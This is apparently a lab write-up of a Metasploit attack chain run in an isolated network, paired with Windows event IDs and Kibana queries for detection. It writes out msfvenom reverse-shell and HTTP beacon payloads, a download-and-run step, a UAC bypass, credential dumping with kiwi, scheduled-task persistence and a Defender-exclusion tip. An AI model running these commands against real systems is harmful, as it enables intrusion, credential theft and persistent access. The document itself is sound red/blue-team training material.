# Metasploit Setup – Nation-State Lab

## 1. Overview

Metasploit Framework is the industry-standard penetration testing platform. It provides:

- **msfconsole** – interactive command-line interface for exploits, sessions, and post-exploitation.
- **msfvenom** – payload generator for creating executables and shellcode.
- **multi/handler** – listener for reverse shells and Meterpreter sessions.

In this lab, Metasploit was installed on Kali Linux (`192.168.1.5`) and used to:

- Generate a reverse shell payload (`shell.exe`) for WS1 initial access.
- Capture Meterpreter session and escalate privileges via UAC bypass.
- Dump credentials using `kiwi` (Mimikatz).
- Establish HTTP-based persistence on the Domain Controller.

All activity was executed in an isolated lab network and logged via Winlogbeat into Kibana.

---

## 2. Installation on Kali Linux

Metasploit is preinstalled on Kali. To ensure latest version:

```bash
sudo apt update
sudo apt install metasploit-framework -y
```

### Start Metasploit

```bash
msfconsole -q
```

If prompt appears (`msf6 >`), installation is successful.

---

## 2.1 PostgreSQL Database Setup

Metasploit uses PostgreSQL for session storage.

```bash
sudo msfdb init
```

### Verify database

```text
msf6 > db_status
```

Expected output:
```
[*] Connected to msf. Connection type: postgresql
```

---

## 3. Payload Generation with msfvenom

### 3.1 Generate Reverse Shell

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f exe -o /tmp/shell.exe
```

| Parameter | Value | Purpose |
|----------|------|--------|
| -p | reverse_tcp | Meterpreter payload |
| LHOST | 192.168.1.5 | Attacker IP |
| LPORT | 4444 | Listener port |
| -f | exe | Output format |
| -o | shell.exe | Output file |

---

### 3.2 Transfer Payload to Target

On Kali:

```bash
python3 -m http.server 8080
```

On Windows (WS1):

```powershell
Invoke-WebRequest -Uri "http://192.168.1.5:8080/shell.exe" -OutFile "C:\Users\Public\shell.exe"
```

---

## 4. Listener Setup (multi/handler)

### Start Metasploit

```bash
msfconsole -q
```

### Configure handler

```text
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.5
set LPORT 4444
set ExitOnSession false
exploit -j
```

---

### Session received

```text
[*] Meterpreter session 1 opened
```

Interact:

```text
sessions -i 1
```

---

## 5. Post Exploitation

### 5.1 System Info

```text
sysinfo
```

---

### 5.2 UAC Bypass (Privilege Escalation)

```text
use exploit/windows/local/bypassuac
set SESSION 1
set LHOST 192.168.1.5
set LPORT 4445
run
```

Result:
- New SYSTEM session created

Detection:
- Event ID 4688 (eventvwr.exe, sdclt.exe)

---

### 5.3 Credential Dumping (Kiwi)

```text
load kiwi
creds_all
```

Detection:
- Event ID 4663
- Sysmon Event ID 10 (lsass access)

---

### 5.4 Persistence (Scheduled Task)

```cmd
schtasks /create /tn "Updater" /tr "C:\Users\Public\shell.exe" /sc daily /st 09:00 /f
```

Detection:
- Event ID 4698

---

## 6. HTTP Beacon (C2 Channel)

### Generate payload

```bash
msfvenom -p windows/meterpreter/reverse_http LHOST=192.168.1.5 LPORT=8080 -f exe -o /tmp/beacon.exe
```

---

### Listener

```text
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_http
set LHOST 192.168.1.5
set LPORT 8080
exploit -j
```

---

## 7. Kibana Detection Mapping

| Phase | Event IDs | Query |
|------|----------|------|
| Reverse shell | 4688 | process.executable:*shell.exe |
| Persistence | 4698 | taskname:Updater |
| UAC bypass | 4688 | eventvwr.exe OR sdclt.exe |
| LSASS access | 4663,10 | lsass.exe |
| Beacon | 4688,3 | beacon.exe |

---

## 8. Troubleshooting

| Issue | Cause | Fix |
|------|------|-----|
| No connection | Defender blocked | Add exclusion |
| Session not opening | Wrong LHOST | Check IP |
| UAC bypass fails | Defender/UAC patch | Try alternative exploit |
| Session dies | Firewall timeout | Use reverse_http |
| Kiwi error | Module issue | Migrate to explorer.exe |

---

## 9. Summary

| Component | Status | Purpose |
|----------|--------|--------|
| msfvenom | Used | Payload creation |
| multi/handler | Used | Listener |
| bypassuac | Used | Privilege escalation |
| kiwi | Used | Credential dumping |
| scheduled task | Used | Persistence |
| reverse_http | Used | C2 channel |

---

## Final Conclusion

Metasploit successfully demonstrated a full attack chain including initial access, privilege escalation, credential dumping, and persistence. All activities were detected via Windows logs and Kibana dashboards, validating the effectiveness of the monitoring system.